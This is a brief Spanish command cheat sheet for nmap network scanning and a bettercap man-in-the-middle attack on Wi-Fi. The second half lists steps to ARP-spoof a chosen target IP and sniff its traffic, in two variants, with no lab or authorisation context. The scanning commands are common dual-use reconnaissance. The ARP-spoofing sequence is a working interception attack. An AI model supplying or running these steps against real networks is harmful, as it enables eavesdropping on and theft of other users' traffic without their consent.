#COMANDO PARA VER EL MANUAL DE NMAP
man nmap
#COMANDO PARA ESCANEAR ALGUNAS IP EN EL LIMBO
sudo nmap 192.168.0.0/24
sudo nmap -sP 192.168.1.0/24
#COMANDO PARA ESCANEAR POR RANGO
sudo nmap -sL 192.168.1-255
#COMANDO PARA ESCANEAR LOS PUERTOS MAS USADOS, EL SISTEMA Y DETALLES
sudo nmap -sS -O -v ip




#COMANDOS  CON BETTERCAP PARA MIMT WIFI
sudo bettercap
#COMANDO PARA CONOCER LA HERRAMIENTA
help
#COMANDO PARA VER A LAS IDENTIDADES
net.probe on
net.show
#COMANDO PARA BAUTIZAR LA IDENTIDAD Y PODER VER
set arp.spoof targets {ip}
arp.spoof on
net.sniff on

#ALTERNATIVA 2
net.probe on
ticker on
set arp.spoof targets {ip}
set arp.spoof on
net.sniff.verbose false
net.sniff on
